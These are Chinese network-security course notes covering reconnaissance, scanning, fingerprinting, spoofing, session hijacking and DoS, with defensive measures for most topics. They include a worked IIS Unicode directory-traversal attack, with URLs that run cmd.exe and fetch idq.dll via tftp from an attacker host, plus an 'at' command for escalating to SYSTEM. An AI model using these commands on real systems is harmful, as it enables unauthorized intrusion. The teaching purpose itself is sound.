- **GNSO：**基本名称支持组织, 负责通用顶级域名分配
  
- **CNNSO：**国家代码域名支持组织, 负责国家顶级域名分配
- **国内**
  - **公网：**CNNIC、ISPs(电信,网通…)、域名服务商(万网)
  - **教育网：**CERNET、赛尔网络

##### **（2）DNS注册信息Whois查询**

- 域名注册过程
  - 注册人(Registrant) -> 注册商(Registrar) -> 官方注册局(Registry)

  - 3R注册信息：分散在官方注册局或注册商各自维护数据库中

  - 官方注册局一般会提供注册商和Referral URL信息

  - 具体注册信息一般位于注册商数据库中

- WHOIS查询
  - 查询特定域名的3R详细注册信息
  - 域名注册信息查询: ICANN(IANA)à域名官方注册局à域名服务商
  - Whois Web查询服务：官方注册局、注册商
  - 寻找域名注册信息数据库并查询返回结果的Whois Web查询服务：万网、站长之家(whois.chinaz.com)
  - 集成工具: Whois客户程序,SamSpade, SuperScan, …

##### **（3）IP Whois查询**

- IP分配过程
  - ICANN的地址管理组织ASO总体负责
  - 协调地区性Internet注册机构（RIR）和国家级Internet注册机构（NIR）进行具体分配与维护
  - 每家RIR都知道每段IP地址范围属于哪家管辖
  - 具体分配信息在NIR/ISP维护
- IP Whois查询过程
  - 任意RIR的Whois服务 (北美: ARIN, 亚太: APNIC)
  - 210.45.240.3查询示例
    - ARIN的Whois Web服务, 告知这段IP由APNIC管辖
    - APNIC的Whois Web服务, 给出该网段属于合工大，细节信息
  - 可能有时需要到NIR(CNNIC)或ISP查询更细致信息
- 自动化程序和服务
  - Whois客户程序
- 根据IP反向查域名
- 根据IP查真实地址

##### **（4）DNS与IP查询安全防范措施**

- 公用数据库中提供信息的安全问题
  - 必须向注册机构提供尽可能准确的信息
- 采用一些安防措施不让攻击者轻易得手
  - 及时更新管理性事务联系人的信息
  - 尝试使用虚构的人名来作为管理性事务联系人
  - 慎重考虑所列的电话号码和地址等信息
  - 注意域名注册机构允许更新注册信息的方式，并确保其中关键信息的安全

#### 5、勘察网络

- Traceroute – 路由跟踪

  - 探测网络路由路径，可用于确定网络拓扑

  - 主机发送TTL从1开始逐步增1的IP包，网络路径上路由器返回ICMP TIME_EXECEEDED

  - UNIX/Linux: traceroute

  - Windows: tracert

  - 穿透防火墙: traceroute -S -p53 TARGET_IP
  - 图形化界面工具: VisualRoute, NeoTrace, Trout

- 网络侦察防范措施

  - 路由器配置: 只允许特定系统响应ICMP/UDP数据包

  - 网络入侵检测系统/网络入侵防御系统: Snort

### 5.2.3 网络扫描技术（看实验）

> 在踩点获得的目标的IP地址、DNS服务器、电子邮件服务器等信息的基础上，通过扫描，进一步收集信息，以便确定目标系统是否在线、开放的服务、使用的系统，以及寻找可能存在的漏洞。

![](https://pic.imgdb.cn/item/6277434f094754312946f2e8.jpg)

#### 1、主机扫描

比较简单的方法就是向目标主机发送ICMP包，通过分析返回信息确定目标主机是否在线。

Ping是Windows系统中最常见最简单的一个发送ICMP包的工具，对于单个主机和小规模网络比较实用。

当网络规模较大时，可以采用Fping或SuperScan等工具，可以自动的向不同的IP地址发送大量的ICMP包。

**例1：Fping**

Fping是Windows平台下的一个能够自动发送大量ICMP包的工具，可以通过25个选项实现许多探测主机是否在线的功能。Fping的使用方法很简单，基本和Ping一致。

![](https://pic.imgdb.cn/item/627743ee0947543129498e2e.jpg)

Fping的十个特色功能：

![](https://pic.imgdb.cn/item/6277440f09475431294a1765.jpg)

**例2：Nmap**

nmap是一款优秀的免费网络扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。

其基本功能有三个，一是探测一组主机是否在线；其次是扫描 主机端口，嗅探所提供的网络服务；还可以推断主机所用的操作系统 。Nmap可用于扫描仅有两个节点的LAN，直至500个节点以上的网络。Nmap 还允许用户定制扫描技巧。通常，一个简单的使用ICMP协议的ping操作可以满足一般需求；也可以深入探测UDP或者TCP端口，直至主机所 使用的操作系统；还可以将所有探测结果记录到各种格式的日志中， 供进一步分析操作。

**例3：SuperScan**

![](https://pic.imgdb.cn/item/6277445b09475431294b5b98.jpg)

#### 2、端口扫描

确定目标系统提供的服务对于入侵者而言至关重要。每一种服务在传输层上表现为目标系统对某个端口（TCP或UDP）处于监听状态。因此，可以通过扫描这些端口的方式进行确认。

通常，端口扫描是利用某种数据包构造工具，针对目标系统发送特别的协议数据包，并根据目标系统的返回信息分析对方开放的端口。

对于TCP而言，一般都是利用连接建立（三次握手）过程中的某些特点进行扫描。

![](https://pic.imgdb.cn/item/627744a709475431294c6a46.jpg)

##### （1）TCP Connect扫描

最基本的扫描方式，实际上是利用Linux提供的系统调用函数connect与目标主机建立TCP连接，完成三次握手。

这种扫描方式会被防火墙记录到访问日志中。因此，会留下扫描痕迹。但是，这种扫描不需要有特殊权限

TCP connect端口扫描服务端与客户端建立连接成功（**目标端口开放**）的过程： 

1. Client端发送SYN；
2. Server端返回SYN/ACK，表明端口开放；
3. Client端返回ACK，表明连接已建立；
4. Client端主动断开连接。

TCP connect端口扫描服务端与客户端未建立连接成功（**目标端口关闭**）过程： 

1. Client端发送SYN；
2. Server端返回RST/ACK，表明端口未开放。

这种扫描方法的优点是实现简单，对操作者的权限没有严格要求（有些类型的端口扫描需要操作者具有root权限），任何用户都可以使用，而且如果想要得到从目标端口返回banners信息，也只能采用这一方法。

另一优点是扫描速度快。如果对每个目标端口以线性的方式，使用单独的connect()调用，可以通过同时打开多个套接字，从而加速扫描。

这种扫描方法的缺点是会在目标主机的日志记录中留下痕迹，易被发现，并且数据包会被过滤掉。目标主机的logs文件会显示一连串的连接和连接出错的服务信息，并且能很快地使它关闭。

##### （2）TCP SYN 扫描

向目标主机的一个端口发送请求连接的SYN包，在收到SYN/ACK后，不是发送的ACK应答而是发送RST包请求断开连接。这样，三次握手就没有完成，无法建立正常的TCP连接，因此，这次扫描就不会被记录到系统日志中。

这种扫描技术一般不会在目标主机上留下扫描痕迹。但是，这种扫描需要有root权限。

![](https://pic.imgdb.cn/item/627745de0947543129510b4d.jpg)

##### （3）秘密扫描

秘密扫描是一种不被审计工具所检测的扫描技术，通常用于在通过普通的防火墙或路由器的筛选（filtering）时隐藏自己。

秘密扫描能躲避IDS、防火墙、包过滤器和日志审计，从而获取目标端口的开放或关闭的信息。由于没有包含TCP 3次握手协议的任何部分，所以无法被记录下来，比半连接扫描更为隐蔽。

这种扫描的缺点是扫描结果的不可靠性会增加，而且扫描主机需要自己构造IP包。现有的秘密扫描有TCP FIN扫描、TCP ACK扫描、NULL扫描、XMAS扫描和SYN/ACK扫描等。

按照标准TCP协议规范，针对这些伪造的TCP报文：

- 开放端口：丢弃这些伪造的TCP报文，并不会给发送方有任何反馈；
- 关闭端口：反馈RST包

> 但是，Windows/Cisco等系统没有遵从规范，开放端口对于伪造TCP包也反馈RST。

**①FIN扫描**

许多过滤设备允许FIN数据包通过，因为FIN是中断连接的数据报文，通常日志系统不记录这样的数据报文。

FIN扫描的原理就是向目标主机的某个端口发送一个FIN数据包。如果收到RST应答表示这个端口没有开放，反之则端口开放。但是有些操作系统不管端口是否开放，都应答RST。

![](https://pic.imgdb.cn/item/62774664094754312952e76a.jpg)

**②ACK扫描**

扫描主机向目标主机发送ACK数据包。根据返回的RST数据包有两种方法可以得到端口的信息。

方法一： 若返回的RST数据包的TTL值小于或等于64，则端口开放，反之端口关闭。

![](https://pic.imgdb.cn/item/6277469e094754312953c4d0.jpg)

方法二： 若返回的RST数据包的WINDOW值非零，则端口开放，反之端口关闭。

![](https://pic.imgdb.cn/item/627746d70947543129549013.jpg)

**③NULL扫描**

扫描主机将TCP数据包中的ACK（确认）、FIN（结束连接）、RST（重新设定连接）、SYN（连接同步化要求）、URG（紧急）、PSH(接收端将数据转由应用处理)标志位置空后发送给目标主机。

若目标端口开放，目标主机将不返回任何信息，若目标主机返回RST信息，则表示端口关闭。

![](https://pic.imgdb.cn/item/62774714094754312955890a.jpg)

**④XMAS扫描**

XMAS扫描原理和NULL扫描的类似，将TCP数据包中的ACK、FIN、RST、SYN、URG、PSH标志位置1后发送给目标主机。

若目标主机不返回任何信息，则目标端口开放；若返回RST，则目标端口关闭

![](https://pic.imgdb.cn/item/62774745094754312956397b.jpg)

**⑤SYN/ACK扫描**

扫描主机不向目标主机发送SYN数据包，而先发送SYN/ACK数据包。目标主机将报错，并判断为一次错误的连接。

若目标端口开放，则目标主机将返回RST信息；否则，目标端口关闭。

![](https://pic.imgdb.cn/item/62775f3e0947543129ade8d5.jpg)

##### （4）UDP扫描

这种扫描攻击用来确定目标主机上开放的UDP端口。通常是通过发送零字节的UDP数据包到目标机器的各个UDP端口，如果收到一个“ICMP端口无法到达”的回应，则表明目标端口关闭；否则就是目标端口开放。

UDP扫描的意义：确定目标主机是否存在那些基于UDP协议的服务如SNMP、TFTP、NFS、DNS。

##### （5）端口扫描工具

SuperScan；NMAP；advanced port scanner ；流光 fluxay

##### （6）端口扫描防范

- 定期扫描网络主机、开放的端口
- 关闭所有不必要开放的端口 
- 在状态防火墙等处设置规则，阻塞扫描 
- 设置入侵检测系统（IDS）能够有效的预警端口扫描

#### 3、目标系统类型探查

系统类型探查设法明确目标主机上运行的操作系统和开放的网络服务。

确定操作系统类型的常用方法有两个，分别是是主动和被动协议栈指纹鉴别。

![](https://pic.imgdb.cn/item/6277485c09475431295af0e1.jpg)

##### （1）协议栈指纹主动识别

扫描器主动向目标系统发送特殊格式的数据包，并根据目标系统返回的信息进行判断。这种方式可能会被网络IDS系统检测出来。

- FIN 探测报文

  向目标主机发送一个只有FIN标志的TCP数据包到一个打开的端口。如果目标主机使用的是Windows操作系统，则会返回一个FIN/ACK报文，从而可以确定目标主机使用的是Windows操作系统。

- ACK序号

  向目标主机发送一个 FIN/PSH/URG标志的TCP数据包到一个关闭的 TCP端口。如果目标主机使用的是Windows操作系统，则返回的是一个序号为初始序号加1的ACK报文。

- ISN（初始化序列号）

  在响应一个连接请求时，Windows系统选择TCP ISN时采用一种时间相关的模型 在Windows系统中，ISN的增加等于两次连接之间时间差的毫秒数。

- TOS（服务类型）

  TOS是IP包中的一个字段，现改为区分服务（DiffServ）。对目标主机的某个关闭的端口发送连接请求，若目标主机为Windows操作系统，则回应的 ICMP 端口不可达消息包中，TOS的值为 0。

- 特殊端口

  若主机的操作系统是Windows，则会开放一些特殊的端口 ，比如 137 、138、139 和 445 。

##### （2）协议栈指纹被动识别

协议栈指纹主动识别需要主动向自标发送数据包，容易被对方的IDS 捕获。为了隐秘地识别远程操作系统，需要使用协议栈指纹被动识别。协议栈指纹被动识别在原理上和主 动协议战指纹识别相似，但是不是主动发送数据包，而是通过监控目标主机通信方法推测其操作系统类型。

因此，被动识别成功的前提是攻击者必须在网络的通信枢纽上，通过诸如端口镜像等方式，捕获并分析目标主机发出的数据包。

在TCP/IP会话中，有几个基本属性对识别操作系统有用：

- 数据包存活期（Time To Live，TTL）：操作系统设置的发出数据包的生存期；
- 窗口尺寸（Window Size）：操作系统设置的数据窗口长度；
- Don’t Fragment it(DF)：操作系统设置的是否允许分片。

![](https://pic.imgdb.cn/item/6277494109475431295ebd1e.jpg)

##### （3）网络服务类型探查

- 网络服务类型探查
  - 确定目标网络中开放端口上绑定的网络应用服务类型和版本
  - 了解目标系统更丰富信息, 可支持进一步的操作系统辨识和漏洞识别
- 网络服务主动探测
  - 网络服务旗标抓取和探测: nmap -sV
- 网络服务被动识别
  - 网络服务特征匹配和识别: 抓取流量包进行特征分析和匹配，从而识别正在提供的网络服务。

##### （4）协议栈指纹侦查的防范

- 检测

  通过检测扫描活动的方法可以检测到非正常的数据包，从而帮助管理员判断是否有来自其他主机的操作系统主动侦查，对于被动侦查无济于事。

- 防范

  防范操作系统侦查相对比较困难。

  一种方法是尽可能关闭不使用的端口，但对于某些端口涉及到操作系统的功能，不能关闭（如Windows的137、138、139和445等端口关闭后将影响Windows的Netbios功能，局域网的共享功能将会丧失）；

  另一种方法是修改操作系统内核参数，使得指纹比对失效，但会违反TCP/IP的规定，从而可能对操作系统的其他正常功能造成影响。

#### 4、漏洞扫描

##### （1）漏洞和漏洞扫描

- 漏洞
  - Security Vulnerability，安全脆弱性
  - 一般认为，漏洞是指硬件、软件或策略上存在的的安全缺陷，从而使得攻击者能够在未授权的情况下访问、控制系统。
- 漏洞扫描
  - 检查系统是否存在已公布安全漏洞，从而易于遭受网络攻击的技术。

##### （2）漏洞不可避免

- 系统设计缺陷
  - Internet从设计时就缺乏安全的总体架构和设计
  - TCP/IP中的三阶段握手
- 软件源代码的急剧膨胀
  - Windows 95 1500万行 Windows 98 1800万行
  - Windows XP 3500万行 Windows Vista 5000万行
  - Linux 内核200万行
- 软件实现的缺陷
  - 微软开发人员的单体测试缺陷从超过25个缺陷/千行代码显著降低到7个缺陷/千行代码

##### （3）漏洞扫描的作用

- 检查系统是否存在已公布安全漏洞，从而易于遭受网络攻击的技术。
- 双刃剑
  - 网络管理员用来检查系统安全性，渗透测试团队(Red Team)用于安全评估。
  - 攻击者用来列出最可能成功的攻击方法，提高攻击效率。

##### （4）防范漏洞扫描

- 最简单对策：
  - 假设黑客会使用漏洞扫描来发现目标网络弱点，必须在黑客之前扫描漏洞
  - 补丁自动更新和分发: 修补漏洞
- 联邦桌面核心配置计划(FDCC)
  - 确保桌面计算机的安全漏洞及补丁自动管理
- 检测和防御漏洞扫描行为
  - 网络入侵检测系统: Snort
  - 仔细审查防火墙配置规则

### 5.2.4 查点技术基础

查点（Enumeration）是根据踩点和扫描阶段获得的目标系统中资源和服务进一步勘查的过程。是继踩点、扫描之后一项网络情报信息搜集技术

针对已知的弱点，对识别出来的服务进行更加充分更具针对性的探查，来寻找真正可以攻击的入口，以及攻击过程中可能需要的关键数据。

查点技术通常与具体的系统平台关系密切，在很大程度上依赖端口扫描和操作系统侦查的结果。事实上，通常将端口扫描和查点功能捆绑在同一个工具中。

查点技术涉及到许多服务功能，一般要求首先对这些服务实现的过程和原理有一定的了解。

#### 1.  旗标抓取

最基础的查点技术是旗标抓取。所谓旗标（banner）是指在第一次连接时，目标软件给出的软件名称、版本号等信息。

旗标抓取可以简单地定义为连接到远程应用程序并现察其输出，远程攻击者往往可以通过旗标抓取技术获得大量信息。最低限度，攻击者可以识别出正在目标系统上运行的各项服务。在许多情况下，这些信息己足以让攻击者开始时目标系统的潜在弱点展开研究。

许多端口扫描工具可以在识别开放端口（通常预示着一项可利用的服务）的同时执行旗际抓取。

#### 2. Windows网络服务查点技术基础

- Windows网络服务
  - NetBIOS网络基本输入输出系统服务
  - SMB文件与打印共享服务
  - AD活动目录与LDAP轻量级目录访问协议
  - MSRPC微软远过程调用服务
- Windows平台网络服务查点
  - NetBIOS主机查点
  - SMB会话查点
  - 目录查点
  - MSRPC查点

## 5.3 网络攻击技术

### 5.3.1 入侵及提升权限

#### 1、获取访问权限

##### （1）口令猜测

虽然已经很古老，猜测用户名和口令仍然是获取Windows系统非授权访问权限最有效和最轻松的方法之一。

远程攻击 Windows 系统的方法是攻击文件和打印共享服务，这是运行在 SMB（Server Message Block，服务消息块）协议。在Windows2000及以后的版本中，SMB除了使用139号TCP端口外，还使用445号TCP端口，实现直连主机的服务，其实质是 SMB over HTTP服务。

若SMB开放（Windows防火墙默认阻止）时，可以试着连接一个共享卷，如进程间通信共享卷（IPC\$）或系统管理共享卷（C\$），尝试各种用户名/口令组合，直到能进入目标系统为止。

**防范措施**

完全阻止口令猜测比较困难，能做的只是提高猜测的难度。

- 禁止administrator、guest等用户名的使用
- 制定和实施强口令策略，提升猜测的难度
- 在防火墙上禁止或限制TCP 139和TCP 445号端口上的 SMB 服务 
- 设置账户锁定阈值，并确保也将阈值应用于Administrator等系统默认的账户。
- 记录账户登录失败事件，并定时查看Event Logs日志文件

##### （2）口令窃听

猜测口令是一件非常艰苦和枯燥的工作。如果能在用户登录服务器时窃听其口令，就可以免去大量无效的猜测。

##### （3）Unicode漏洞攻击（重点）

Unicode是为了解决传统的字符编码方案的局限而产生的统一编码方案。Unicode为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。

在默认的情况下，IIS的某些目录允许通过提交HTTP请求执行可执行文件。当IIS打开可执行文件时，如果文件包含Unicode字符，IIS将首先进行解码。这时，如果文件名中包含了某些特殊字符，则将导致IIS错误的打开或执行某些WEB根目录以外的程序。

微软IIS 5.0和5.0都存在利用扩展UNICODE字符取代"/"和"\\"而能利用"../"目录遍历的漏洞。

**IIS解析Unicode编码的过程**

![](https://pic.imgdb.cn/item/62774d8f09475431296e5329.jpg)

![](https://pic.imgdb.cn/item/62774d7a09475431296dfd65.jpg)

**Unicode漏洞的攻击过程**

在Windows的CMD（即DOS）状态下，’../’表示上级目录，因此：

`http://IP/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir+c:\` 等价于`http://IP/scripts/../../winnt/system32/cmd.exe?/c+dir+c:\`

上述http请求就绕开了IIS对’../..’的检查，成功的实现了在http中执行CMD命令的执行，并且可以更进一步的行使其他更危险的命令。

**利用Unicode漏洞入侵系统**

在地址栏上执行命令，用户的权限比较低，系统管理指令（如net等）不能执行。利用Unicode可以入侵对方的系统，并得到管理员权限。

作为入侵的第一步，首先建立TFTP（Text File Transmission Protocol，普通文件传输协议）服务器，以便向对方的scripts文件夹传几个文件。

其次，将idq.dll和tftpd32.exe放在本地的同一目录下，执行tftpd32.exe程序。 

再次，保留上述窗口，通过通过这个服务器向对方传递idq.dll文件。为此，在浏览器中执行命令：

`http://172.18.25.109/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+tftp+-i+172.18.25.110+get+idq.dll`

命令其实是“tftp –i 172.18.25.110 get idq.dll”意思是从172.18.25.110服务器上获取idq.dll文件。 

在对方的scripts目录中上传了一个idq.dll文件后，只需在本地使用工具软件ispc.exe入侵对方系统。就可以在对方计算机上做管理员可以做的一切事情，比如添加用户，建立一个用户名为“Hacker123”，密码也是“Hacker123”的用户。

#### 2、权限提升

攻击者在获得Windows的一个登录权限后，经常做的下一步工作就是提升权限，以便获得终极特权账户Administrator或System的权限，从而开展进一步的攻击。

##### （1）常见的权限提升工具

- Netddemsg

  网络动态数据交换（Network Dynamic Data Exchange，NetDDE）是一种在不同Windows系统的 应用程序之间动态共享数据的技术。Netddemsg利用NetDDE服务的漏洞攻击Windows 2003，并把权限提升到 System。

- Debploit

  会话管理子系统（Session Manager Subsystem，SMSS）是Windows登录时负启动用户会话的进程。Debploit利用SMSS的一个漏洞进行攻击，从而将权限提升到System。

##### （2）administrator和System

在技术角度，获得Administrator权限并不等于获得Windows主机的最高 权限 System 账户（也称“Local System”，或“NT AUTHORITY\ SYSTEM”账户）。System的权限比Administrator的权限更大。

在获得Administrator权限后，可以利用Windows的计划任务服务打开一个命令shell获得System权限：

`C:\>at 16:33 / INTERACTIVE cmd.exe`

##### （3）权限提升防范措施

- 及时安装微软发布的补丁，操作系统核心功能的漏洞只有厂商发布的代码级补丁才能修复。
- 严格限制交互登录权限。在Windows2000及以上的版本中，可以在“本地/组安全策略中进行设置。

### 5.3.2 网络欺骗

#### 1、IP欺骗

攻击者伪装成目标主机信任的主机与目标主机进行通信。略过。

#### 2、邮件欺骗

电子邮件欺骗是指攻击者以假冒发信者的身份向邮件接受者发送电子邮件，以获得邮件接受者的信任，从而骗取敏感信息。

##### （1）欺骗形式

- 使用相似的电子邮件地址
- 修改邮件客户软件的账号配置
- 直接连到smtp服务器上发信

##### （2）电子邮件欺骗成功的关键

基本的电子邮件协议不包括签名机制

##### （3）电子邮件欺骗方法

- **使用相似的地址**
  - 发信人使用被假冒者的名字注册一个账号，然后给目标发送一封正常的信


- **修改邮件客户软件的帐户配置**

​	![](https://pic.imgdb.cn/item/6277511309475431297aea89.jpg)

​	![](https://pic.imgdb.cn/item/62775f780947543129aed0f2.jpg)

- **直接连接smtp服务器**

  通过命令行直接连接smtp服务器的25端口，发送命令。

##### （4）邮件欺骗的防范

- 数字签名
- 邮件服务器的验证
  - Smtp服务器验证发送者的身份，以及发送的邮件地址是否与邮件服务器属于相同的域
  - 验证接收方的域名与邮件服务器的域名是否相同
  - 有的也验证发送者的域名是否有效，通过反向DNS解析
  - 为邮件服务器安装上所有最新的补丁
- 不能防止一个内部用户假冒另一个内部用户发送邮件
- 攻击者可以运行自己的smtp邮件服务器
- 审计制度，所有的邮件都有记录

#### 3、WEB欺骗

 Web是应用层上提供的服务，直接面向Internet用户

##### （1）欺骗的根源

- 由于Internet的开放性，任何人都可以建立自己的Web站点

- Web站点名字(DNS域名)可以自由注册，按先后顺序

- 并不是每个用户都清楚Web的运行规则


##### （2）Web欺骗的动机

- 商业利益，商业竞争

- 政治目的


##### （3）Web欺骗的形式

- 使用相似的域名

- 中间人攻击（略）

- 改写URL


##### （4）使用类似的域名

注册一个与目标公司或组织相似的域名，建立一个欺骗网站，骗取该公司的用户的信任，以便得到这些用户的信息，对于从事商业活动的用户。

- 例如，针对ABC公司，用abc.net来混淆abc.com

- 如果客户提供了敏感信息，那么这种欺骗可能会造成进一步的危害，例如：

  用户在假冒的网站上订购了一些商品，然后出示支付信息，假冒的网站把这些信息记录下来(并分配一个cookie)，然后提示：现在网站出现故障，请重试一次。当用户重试的时候，假冒网站发现这个用户带有cookie，就把它的请求转到真正的网站上。用这种方法，假冒网站可以收集到用户的敏感信息。

##### （5）改写URL

一个HTTP页面从Web服务器到浏览器的传输过程中，如果其中的内容被修改了的话，则欺骗就会发生，其中最重要的是URL改写，例如：

`<a href= www.hackersite> Welcom to Hollywood-Movie site.</a>`

有一些更为隐蔽的做法：

- 直接指向一些恶意的代码

- 把url定向放到script代码中，难以发现


改写页面的做法

- 入侵Web服务器，修改页面

- 设置中间http代理

- 在传输路径上截获页面并改写

- 在客户端装载后门程序


##### （6）Web欺骗防范

- 使用类似的域名
  - 对站点使用服务器认证
  - 注意观察URL地址栏的变化
  - 不要信任不可靠的URL信息
- 改写URL
  - 注意观察URL地址栏的变化
  - 查看页面的源文本可以发现
  - 使用SSL

### 5.3.3 会话劫持技术

会话劫持（Session Hijack）是结合了嗅探和欺骗技术在内的攻击手段。

例如，在一次正常的会话过程当中，攻击者作为第三方参与到其中，既可以在正常数据包中插入恶意数据，也可以在双方的会话当中进行监听，甚至可以是代替某一方主机接管会话。

- 被动劫持：监听网络会话流量，以发现密码或者其他敏感信息

- 主动劫持：找到当前活动的会话，并且把会话接管过来。迫使一方下线，由劫持者取而代之。攻击者接管了一个合法会话后，可以做更多危害性更大的事情

#### 1、TCP会话建立过程

根据TCP/IP的规定，使用TCP协议进行通讯需要提供两段序列号，TCP协议使用这两段序列号确保连接同步以及安全通讯，系统的TCP/IP协议栈依据时间或线性的产生这些值。

在通讯过程中，双方的序列号是相互依赖的，如果攻击者直接进行会话劫持，结果肯定是失败的。因为会话双方“不认识”攻击者，攻击者不能提供合法的序列号。所以，会话劫持的关键是预测正确的序列号，攻击者可以采取嗅探技术获得这些信息。

在每一个数据包中，都有序列号和确认号，分别为：

- SEQ：当前数据包中的第一个字节的序号
- ACK：期望收到对方数据包中第一个字节的序号

SEQ和ACK之间必须符合下面的逻辑关系，否则该数据包会被丢弃，并且返回一个ACK包（包含期望的序列号）：

S_ACK <= C_SEQ <= S_ACK + S_WIND
C_ACK <= S_SEQ <= C_ACK + C_WIND

> S_ACK、S_SEQ 、S_WIND分别是服务端的序列号、确认号和数据窗口长度
> C_ACK、C_SEQ 、C_WIND分别是客户端的序列号、确认号和数据窗口长度

如果不符合上述逻辑关系，就会产生出一种称为ACK风暴的“致命弱点”。

**ACK 风暴**

当会话双方接收到一个不期望的数据包后，就会用自己期望的序列号返回ACK包；而在另一端，这个数据包也不是所期望的，就会再次以自己期望的序列号返回ACK包……于是，就这样来回往返，形成了恶性循环，最终导致ACK风暴。

比较好的解决办法是先进行ARP欺骗，使双方的数据包“正常”的发送到攻击者这里，然后设置包转发，最后就可以进行会话劫持了，而且不必担心会有ACK风暴出现。

并不是所有系统都会出现ACK风暴。如Linux系统的TCP/IP协议栈就与RFC中的描述略有不同。

#### 2、TCP劫持方法

##### （1）注射式会话劫持

这种方式的会话劫持相对比较简单，不会改变会话双方的通讯流，而是在双方正常的通讯中流插入恶意数据。

这种方式需要实现两种技术：

- IP欺骗；
- 预测TCP序列号。

对于IP欺骗，首先要隐藏自己的IP地址，其次要利用两台主机之间的信任关系。

对于TCP序列号，可以通过嗅探监听通信双方主机的序列号，或者进行序列号猜测。

##### （2）中间人攻击MITM

要正确实施中间人攻击，攻击者首先需要使用ARP欺骗或DNS欺骗等，将会话双方的通讯流暗中改变，而这种改变对于会话双方来说是一个完全透明的代理，可以得到一切想知道的信息。

**DNS欺骗**

DNS欺骗（也称为DNS劫持）是指攻击者截获目标主机发出的DNS请求报文，并伪造一个DNS响应，其中包含了一个精心挑选的IP地址作为解析结果。通常目标主机就会登陆这个IP地址的主机，并跌入攻击者早已设好的陷阱之中。

#### 3、Https会话劫持之SSLStrip

##### （1）一般HTTPS通信过程：

![](https://pic.imgdb.cn/item/62775450094754312986a454.jpg)

以访问Gmail为例的基本过程如下：

- 客户端浏览器使用HTTP连接到端口80的`http://mail.google.com`；
- 服务器试用HTTP代码302重定向客户端HTTPS版本的这个网站；
- 客户端连接到端口443的网站`https://mail.google.com`；
- 服务器向客户端提供包含其电子签名的证书，该证书用于验证网址；
- 客户端获取该证书，并根据信任证书颁发机构列表来验证该证书；
- 加密通信建立。

如果证书验证过程失败，则意味着无法验证网址的真实度，用户将会看到页面显示证书验证错误，或者他们也可以选择冒着危险继续访问网站，因为他们访问的网站可能是欺诈网站。

##### （2）SSLstrip工作原理

SSLstrip通过监视Http传输进行工作，当用户试图进入加密的https会话时它充当代理。当用户认为安全的会话已经开始时，SSLstrip也通过https连接到安全服务器，所有用户到SSLstrip的连接是http，这就意味着浏览器上警告提示已经被阻止，浏览器看起来正常工作，在此期间所有的用户敏感信息都可以轻易被截获。

![](https://pic.imgdb.cn/item/627754c70947543129887f0e.jpg)

##### （3）劫持HTTPS通信

- 客户端与web服务器间的流量被拦截;
- 当遇到HTTPS URL时，sslstrip使用HTTP链接替换它，并保存了这种变化的映射；
- 攻击机模拟客户端向服务器提供证书；
- 从安全网站收到流量提供给客户端；    

这个过程进展很顺利，服务器仍然在接收SSL流量，服务器无法辨别任何改变。用户可以感觉到唯一不同的是，浏览器中不会标记HTTPS，所以某些用户还是能够看出不对劲。

#### 4、会话劫持防范 

会话劫持防范比较复杂，需要从以下几个方面进行：

（1）使用交换式网络，虽然像Hunt这样的工具可以在交换环境中实现会话劫持，但还是应该使用交换式网络替代共享式网络，因为这样可以防范最基本的嗅探攻击。
（2）防范ARP欺骗。实现中间人攻击的前提是ARP欺骗，如能阻止攻击者进行ARP欺骗，中间人攻击将难以进行。
（3）监视网络流量，如发现网络中出现大量的ACK包，则有可能已被会话劫持攻击。 
（4）采用加密通讯。使用SSH代替Telnet、使用SSL代替HTTP，或者干脆使用IPSec/VPN，这样会话劫持就无用武之地了。

### 5.3.4 拒绝服务和分布式拒绝服务攻击技术（重点）

#### 1、拒绝服务攻击

拒绝服务（Denial of Service，DoS）攻击是指攻击者通过某种手段，有意地造成计算机或网络系统不能正常工作，从而无法向合法用户提供所需要的服务或者使得服务质量降低，破坏系统的可用性。

拒绝服务攻击有些是利用网络协议缺陷，有些则是消耗网络或者设备有限的处理能力。最常见的DoS攻击是资源型风暴攻击，如：计算机网络带宽攻击和连通性攻击。

- 带宽攻击是以极大的通信量冲击网络，使网络所有可用的带宽都被消耗掉，最后导致合法用户的请求无法通过。
- 连通性攻击指用大量的连接请求冲击计算机，最终导致计算机无法再处理合法用户的请求。

#### 2、分布式拒绝服务攻击DDoS（重点）

分布式拒绝服务（Distributed Denial of Service，DDoS）指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DoS攻击，从而成倍地提高拒绝服务攻击的威力。

一个比较完善的DDoS攻击体系通常有四大部分：

- 黑客：通过各种手段获得控制傀儡机和攻击傀儡机控制权或者部分控制权，并把相应的DDoS程序上传到控制傀儡机和攻击傀儡机中，并且想方设法进行隐藏。黑客处于控制傀儡机之后，很难被追踪。
- 控制傀儡机：介于黑客与攻击傀儡机之间的傀儡机，被黑客直接控制，并能够根据黑客的命令向攻击傀儡机发布命令。平时，处于潜伏状态，与正常计算机没有区别。
- 攻击傀儡机：被控制傀儡机控制，根据控制傀儡机的命令对黑客选定的目标开展攻击。平时，处于潜伏状态，与正常计算机没有区别。   
- 目标系统（受害者）：黑客选定的攻击对象。一旦被攻击，目标系统就会出现运行缓慢甚至崩溃，无法为正常的请求提供服务

**被DoS/DDos攻击时的现象：**

- 网络中充斥着大量的无用的数据包，源地址为假。 
- 制造高流量无用数据，造成网络拥塞，使受害主机无法正常和外界通讯。 
- 受害主机无法及时处理所有正常请求。 
- 受害主机响应缓慢，严重时会造成系统死机。 

#### 3、拒绝服务攻击类型

根据攻击特点，DDOS可以分为三种类型：

##### （1）资源消耗型

同时发动大量的攻击傀儡机向目标发送海量的数据包，以消耗目标的带宽资源和存储资源。因此也常常被称为蛮力攻击、洪水攻击等。

在这类攻击中，为了不让目标轻易发现，常常会构造各种类型的数据包，使其与正常服务的数据包难以区分。攻击效果完全依赖于数据包的数量，只有当大量的数据包到达目标时，攻击方才有效。

面对这种类型的DDOS攻击，即使拥有大量资源的网络也难以幸免。

##### （2）以巧取胜型

这类DDOS攻击是利用协议本身或者其软件实现中的漏洞，通过一些非正常的（畸形的）数据包使得受害者系统在处理时出现异常，导致受害者系统崩溃。

这类攻击主要是利用协议或软件漏洞进行攻击，也被称为漏洞攻击或协议攻击。如：Sockstress攻击、NTP放大攻击等。

